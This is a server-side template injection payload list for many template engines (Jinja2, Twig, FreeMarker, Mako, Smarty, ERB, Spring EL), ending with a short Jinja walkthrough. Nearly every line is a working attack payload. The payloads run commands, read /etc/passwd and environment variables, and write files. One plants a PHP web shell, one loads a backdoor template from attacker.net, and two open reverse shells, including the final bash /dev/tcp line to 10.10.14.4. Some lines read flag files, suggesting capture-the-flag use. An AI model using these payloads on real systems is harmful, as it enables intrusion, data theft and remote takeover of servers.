```java
// SSTI BRUTE FORCE LIST

"{{'/etc/passwd'|file_excerpt(1,30)}}"@
#{ 3 * 3 }
#{ 7 * 7 }
#{1+1}
#{3*3}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
${"freemarker.template.utility.Execute"?new()("id")}
${1+1}
${6*6}
${7*7}
${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
${T(java.lang.System).getenv()}
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../index.htm").getContent()}
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
${request.getAttribute("a")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("cmd.exe")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${self.__init__.__globals__['util'].os.system('id')}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.cache.util.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.template.module.runtime.util.os.system("id")}
${{3*3}}
${{7*7}}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
<%= 3 * 3 %>
<%= 7 * 7 %>
<%= Dir.entries('/') %>
<%= File.open('/etc/passwd').read %>
<%= IO.popen('ls /').readlines()  %>
<%= `ls /` %>
<%= system('cat /etc/passwd') %>
<pre>{% debug %}</pre>
@(1+2)
@(6+5)
@import (inline) "/etc/passwd";
@import (inline) "http://localhost";
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
body {color: `global.process.mainModule.require("child_process").execSync("id")`;}
{$smarty.version}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
{php}echo `id`;{/php}
{php}echo `id`;{/php} //deprecated in smarty v3
{system('cat index.php')}
{system('ls')}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
{{ [].class.base.subclasses() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
{{ request }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{''.class.mro()[1].subclasses()}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
{{'a'.toUpperCase()}}
{{2*2}}[[3*3]]
{{3*'3'}}
{{3*3}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 49
{{7*'7'}} would result in 7777777
{{7*7}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{app.request.server.all|join(',')}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{config.items()}}
{{dump(app)}}
{{request.__class__}}
{{request|attr("__class__")}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
{{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
{{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
{{self}}



//jinja flask ssti test
{{7*7}} = 49

//SSTI dump subclasses
{{ ''.__class__.__mro__[1].__subclasses__() }}

```
``` python

#find popen line number in subclass dump
...
199. <class 'selectors.BaseSelector'
200. <class 'subprocess.CompletedProcess'
201. <class 'subprocess.Popen'
202. <class '_socket.'
...

```
```java

//determine popen subclass value `[?]`
{{ ''.__class__.__mro__[1].__subclasses__()[201] }}

//decode bytes to utf8
{{ ''.__class__.__mro__[1].__subclasses__()[201]('whoami', shell=True, stdout=-1).stdout.read().decode('utf-8') }}

//rce
{{ ''.__class__.__mro__[1].__subclasses__()[201]("bash -c 'exec bash -i &>/dev/tcp/10.10.14.4/45655 <&1'", shell=True, stdout=-1).stdout.read().decode('utf-8') }}

